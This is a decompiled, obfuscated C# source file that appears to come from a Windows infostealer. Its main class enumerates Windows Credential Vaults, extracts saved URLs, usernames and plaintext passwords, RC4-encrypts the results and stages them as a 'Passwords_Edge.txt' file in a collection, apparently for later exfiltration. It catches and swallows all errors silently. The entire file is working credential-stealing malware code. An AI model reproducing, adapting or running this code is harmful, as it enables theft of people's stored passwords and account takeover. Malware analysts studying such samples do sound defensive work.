using System;
using System.Collections.Generic;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;

namespace \u030E\u0360\u0313\u034E\u0315\u0E47\u0020\u0305\u035C\u0351\u0E47\u0351\u0320\u0301\u036B\u0300zcryfxllszuahcty\u0347\u0334\u0342\u0E47\u0310\u032C\u0358\u0340\u036B\u0331\u0329\u036B\u0340\u032F\u0308\u0E47cexuwlosbhsreyjl
{
	// Token: 0x02000093 RID: 147
	internal class Class_113
	{
		// Token: 0x060002EF RID: 751 RVA: 0x00015BD4 File Offset: 0x00013DD4
		public static void tmethod_412(string str_0)
		{
			try
			{
				Version version = Environment.OSVersion.Version;
				int major = version.Major;
				int minor = version.Minor;
				int num = 0;
				IntPtr zero = IntPtr.Zero;
				int num2 = Class_105.lmethod_378(0, ref num, ref zero);
				if (num2 != 0)
				{
					Class_113.field_1 = Class_113.field_1 + string.Format("[ERROR] Unable to enumerate vaults. Error (0x" + num2.ToString() + ")", Array.Empty<object>()) + Environment.NewLine;
				}
				IntPtr ptr = zero;
				Dictionary<Guid, string> dictionary = new Dictionary<Guid, string>
				{
					{
						new Guid("2F1A6504-0641-44CF-8BB5-3612D865F2E5"),
						"Windows Secure Note"
					},
					{
						new Guid("3CCD5499-87A8-4B10-A215-608888DD3B55"),
						"Windows Web Password Credential"
					},
					{
						new Guid("154E23D0-C644-4E6F-8CE6-5069272F999F"),
						"Windows Credential Picker Protector"
					},
					{
						new Guid("4BF4C442-9B8A-41A0-B380-DD4A704DDB28"),
						"Web Credentials"
					},
					{
						new Guid("77BC582B-F0A6-4E15-4E80-61736B6F3B29"),
						"Windows Credentials"
					},
					{
						new Guid("E69D7838-91B5-4FC9-89D5-230D4D4CC2BC"),
						"Windows Domain Certificate Credential"
					},
					{
						new Guid("3E0E35BE-1B77-43E7-B873-AED901B6275B"),
						"Windows Domain Password Credential"
					},
					{
						new Guid("3C886FF3-2669-4AA2-A8FB-3F6759A77548"),
						"Windows Extended Credential"
					},
					{
						new Guid("00000000-0000-0000-0000-000000000000"),
						null
					}
				};
				for (int i = 0; i < num; i++)
				{
					object obj = Marshal.PtrToStructure(ptr, typeof(Guid));
					Guid key = new Guid(obj.ToString());
					ptr = (IntPtr)(ptr.ToInt64() + (long)Marshal.SizeOf(typeof(Guid)));
					IntPtr zero2 = IntPtr.Zero;
					string str = dictionary.ContainsKey(key) ? dictionary[key] : key.ToString();
					num2 = Class_105.vmethod_375(ref key, 0U, ref zero2);
					if (num2 != 0)
					{
						Class_113.field_1 = Class_113.field_1 + string.Format("Unable to open the following vault: " + str + ". Error: 0x" + num2.ToString(), Array.Empty<object>()) + Environment.NewLine;
					}
					int num3 = 0;
					IntPtr zero3 = IntPtr.Zero;
					num2 = Class_105.pmethod_379(zero2, 512, ref num3, ref zero3);
					if (num2 != 0)
					{
						Class_113.field_1 = Class_113.field_1 + string.Format("[ERROR] Unable to enumerate vault items from the following vault: " + str + ". Error 0x" + num2.ToString(), Array.Empty<object>()) + Environment.NewLine;
					}
					IntPtr ptr2 = zero3;
					if (num3 > 0)
					{
						for (int j = 1; j <= num3; j++)
						{
							Type type = (major >= 6 && minor >= 2) ? typeof(Class_105.NClass_2) : typeof(Class_105.NClass_3);
							object obj2 = Marshal.PtrToStructure(ptr2, type);
							ptr2 = (IntPtr)(ptr2.ToInt64() + (long)Marshal.SizeOf(type));
							IntPtr zero4 = IntPtr.Zero;
							FieldInfo field = obj2.GetType().GetField("SchemaId");
							Guid guid = new Guid(field.GetValue(obj2).ToString());
							IntPtr intPtr = (IntPtr)obj2.GetType().GetField("pResourceElement").GetValue(obj2);
							IntPtr intPtr2 = (IntPtr)obj2.GetType().GetField("pIdentityElement").GetValue(obj2);
							ulong num4 = (ulong)obj2.GetType().GetField("LastModified").GetValue(obj2);
							IntPtr intPtr3 = IntPtr.Zero;
							if (major < 6 || minor < 2)
							{
								num2 = Class_105.xmethod_381(zero2, ref guid, intPtr, intPtr2, IntPtr.Zero, 0, ref zero4);
							}
							else
							{
								intPtr3 = (IntPtr)obj2.GetType().GetField("pPackageSid").GetValue(obj2);
								num2 = Class_105.smethod_380(zero2, ref guid, intPtr, intPtr2, intPtr3, IntPtr.Zero, 0, ref zero4);
							}
							if (num2 != 0)
							{
								Class_113.field_1 = Class_113.field_1 + string.Format("Error occured while retrieving vault item. Error: 0x" + num2.ToString(), Array.Empty<object>()) + Environment.NewLine;
							}
							object obj3 = Marshal.PtrToStructure(zero4, type);
							object obj4 = Class_113.gmethod_413((IntPtr)obj3.GetType().GetField("pAuthenticatorElement").GetValue(obj3));
							object obj5 = null;
							if (intPtr3 != IntPtr.Zero)
							{
								obj5 = Class_113.gmethod_413(intPtr3);
							}
							if (obj4 != null)
							{
								object obj6 = Class_113.gmethod_413(intPtr);
								if (obj6 != null)
								{
									Class_113.field_1 = Class_113.field_1 + string.Format("Url: {0}", obj6) + Environment.NewLine;
								}
								object obj7 = Class_113.gmethod_413(intPtr2);
								if (obj7 != null)
								{
									Class_113.field_1 = Class_113.field_1 + string.Format("Username: {0}", obj7) + Environment.NewLine;
								}
								if (obj5 != null)
								{
									Class_113.field_1 = Class_113.field_1 + string.Format("PacakgeSid: {0}", obj5) + Environment.NewLine;
								}
								Class_113.field_1 = Class_113.field_1 + string.Format("Password: {0}\n\n", obj4) + Environment.NewLine;
								Class_113.field_0++;
							}
						}
					}
				}
				Class_53.\u0347\u0020\u0328\u0020\u0369\u0E47h\u0364\u0358\u036D\u036B\u0324\u0322\u0E47\u031F\u0369qhgddlayjusqyuib\u0353c\u0347\u036Dr\u0020\u0E47\u0356\u0356\u0332\u036D\u0347\u0325\u030E\u0E47\u0356gugwsaxccacjclln.Add(Class_47.\u035A\u0020\u0359\u0E47\u0366\u0349\u0320\u0348\u034A\u0341\u0339\u034B\u0020\u032F\u0306\u0020zqzxlmywryhyzjxq\u0E47\u0020\u0349\u0315\u0E47\u0324\u0340i\u0303\u033C\u0E47\u0020\u0345\u035C\u034E\u0307aibpggrwzsglawli + "\\Passwords_Edge.txt", Class_47.RC4(Encoding.UTF8.GetBytes(Class_113.field_1)));
				Class_113.field_1 = "";
			}
			catch
			{
			}
		}

		// Token: 0x060002F2 RID: 754 RVA: 0x00016154 File Offset: 0x00014354
		[CompilerGenerated]
		internal static object gmethod_413(IntPtr arg_0)
		{
			object obj = Marshal.PtrToStructure(arg_0, typeof(Class_105.NClass_4));
			object value = obj.GetType().GetField("Type").GetValue(obj);
			IntPtr ptr = (IntPtr)(arg_0.ToInt64() + 16L);
			switch ((int)value)
			{
			case 0:
			{
				object obj2 = Marshal.ReadByte(ptr);
				return (bool)obj2;
			}
			case 1:
				return Marshal.ReadInt16(ptr);
			case 2:
				return Marshal.ReadInt16(ptr);
			case 3:
				return Marshal.ReadInt32(ptr);
			case 4:
				return Marshal.ReadInt32(ptr);
			case 5:
				return Marshal.PtrToStructure(ptr, typeof(double));
			case 6:
				return Marshal.PtrToStructure(ptr, typeof(Guid));
			case 7:
				return Marshal.PtrToStringUni(Marshal.ReadIntPtr(ptr));
			case 12:
				return new SecurityIdentifier(Marshal.ReadIntPtr(ptr)).Value;
			}
			return null;
		}

		// Token: 0x040001D4 RID: 468
		public static int field_0;

		// Token: 0x040001D5 RID: 469
		public static string field_1 = "";
	}
}
